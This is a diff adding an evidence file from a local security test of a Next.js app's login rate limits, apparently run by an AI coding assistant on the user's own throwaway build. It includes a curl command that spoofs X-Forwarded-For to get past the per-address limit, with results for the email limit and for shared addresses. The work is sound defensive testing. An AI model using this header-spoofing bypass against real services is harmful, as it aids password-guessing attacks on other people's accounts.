@@ -1,0 +1,32 @@
+# Run by Claude Code on the user's machine at the user's request, 2026-11-03. Production build, throwaway database (dropped afterwards). The server is restarted before each part.
+# Script: evidence/14-rate-limit-script.sh. This file shows how the limits can be DEFEATED, and which part still holds.
+# Why this works: Next.js sets x-forwarded-for from the real connection only when the client did not send it (node_modules/next/dist/server/base-server.js:601, the ?"??=" line). On a direct connection a client can therefore choose its own address.
+
+##### A. Defeating the ADDRESS limit: 50 login requests, each claiming a different address (X-Forwarded-For) and using a different email
+$ curl -X POST http://localhost:3077/api/login -H "X-Forwarded-For: 10.0.0.N" -d '{"email":"userN@example.com","password":"x"}'   (N = 1 to 50)
+  50 requests sent, 0 of them refused with 429  (the same 50 from one real address would have stopped at the 21st)
+
+##### B. The EMAIL limit still holds: 6 requests for one email, each claiming a different address
+  request 1 (claims 11.0.0.1) -> 501
+  request 2 (claims 11.0.0.2) -> 501
+  request 3 (claims 11.0.0.3) -> 501
+  request 4 (claims 11.0.0.4) -> 501
+  request 5 (claims 11.0.0.5) -> 501
+  request 6 (claims 11.0.0.6) ->
+  HTTP/1.1 429 Too Many Requests
+  retry-after: 900
+  {"error":"Too many attempts. Please try again later."}
+  a 7th request claiming yet another address ->
+  HTTP/1.1 429 Too Many Requests
+  retry-after: 900
+  {"error":"Too many attempts. Please try again later."}
+
+##### C. The shared-address effect: one person uses up an address, a second person on the same address is refused
+  Person A (address 5.5.5.5) makes 20 login attempts for her own accounts:
+  Person B, a different patient with a different email, same address 5.5.5.5, first attempt ->
+  HTTP/1.1 429 Too Many Requests
+  retry-after: 898
+  {"error":"Too many attempts. Please try again later."}
+  Person B from his own address 6.6.6.6 ->
+  HTTP/1.1 501 Not Implemented
+  {"error":"Logging in is not available yet."}
